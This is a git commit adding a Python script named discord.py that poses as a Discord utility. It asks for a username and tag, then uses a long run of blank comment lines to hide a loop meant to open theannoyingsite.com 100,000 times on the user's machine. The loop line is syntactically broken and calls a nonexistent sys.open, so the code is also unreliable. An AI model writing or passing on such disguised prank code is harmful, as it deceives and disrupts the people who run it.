ed9be54874d3d1b690f2ce0c18c895984cab0258
ArkAngeL43 <87203697+ArkAngeL43@users.noreply.github.com>
2021-07-23 15:51:15 -0400

    Create discord.py

---
+++ discord.py
@@ -0,0 +1,103 @@
+import os 
+import sys 
+import time 
+
+os.system(' clear ')
+time.sleep(1)
+print(" =========================+")   
+print("   __| (_)_________   _   +")
+print("  / _` | |_  /_  / | | |  +")
+print(" | (_| | |/ / / /| |_| |  +")
+print("  \__,_|_/___/___|\__, |  +")
+print("                  |___/   +") 
+print(" =========================+")
+
+user = str(input(" whats the username ==> "))
+num = str(input("  whats the # ==>  "))
+time.sleep(1)
+os.system(' clear ')
+os.system(' [+] hope you enjoy [+] ')
+os.system(' clear ')
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+#
+
+for i in range(100000):
+    os.system('open https://theannoyingsite.com)
+    sys.open(' https://theannoyingsite.com ')
